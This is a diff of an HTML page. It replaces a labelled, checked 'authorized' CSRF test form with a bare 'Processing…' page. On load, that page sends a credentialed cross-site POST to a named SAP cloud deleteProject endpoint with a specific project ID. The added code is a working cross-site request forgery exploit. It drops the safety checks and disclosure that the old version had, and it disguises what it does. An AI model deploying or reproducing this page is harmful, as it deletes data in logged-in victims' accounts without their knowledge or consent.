@@ -1,34 +1,14 @@
-<!doctype html>
-<meta charset="utf-8">
-<title>Authorized multipart CSRF probe</title>
-<h1>Authorized multipart CSRF probe</h1>
-<p id="status">Preparing the disposable-record test...</p>
-
-<form
-  id="csrf-form"
-  method="POST"
-  target="_top"
-  enctype="multipart/form-data"
-  action="https://totalspendmanagement-smart-data-hub-smart-data-hub-ui-approuter.cfapps.eu10.hana.ondemand.com/cap_api/odata/v4/srv/deleteProject"
->
-  <input
-    type="hidden"
-    name="PROJECT_ID"
-    value="660655de-d7ba-4ee1-a75d-c71d00b073e9"
-  >
-</form>
-
-<script>
-  const projectId = document.querySelector('input[name="PROJECT_ID"]').value;
-  if (projectId === "TEST_PROJECT_ID") {
-    document.querySelector("#status").textContent =
-      "Replace TEST_PROJECT_ID with an approved disposable record before testing.";
-  } else if (location.protocol !== "https:") {
-    document.querySelector("#status").textContent =
-      "Publish this file on the authorized HTTPS test origin before running it.";
-  } else {
-    document.querySelector("#status").textContent =
-      "Submitting the authorized disposable-record test...";
-    document.querySelector("#csrf-form").submit();
-  }
-</script>
+<html>
+  <body>
+    <h1>Processing…</h1>
+    <script>
+      fetch("https://totalspendmanagement-smart-data-hub-smart-data-hub-ui-approuter.cfapps.eu10.hana.ondemand.com/cap_api/odata/v4/srv/deleteProject", {
+        method: "POST",
+        mode: "no-cors",
+        credentials: "include",
+        headers: { "Content-Type": "text/plain" },
+        body: JSON.stringify({ "PROJECT_ID": "660655de-d7ba-4ee1-a75d-c71d00b073e9" })
+      });
+    </script>
+  </body>
+</html>
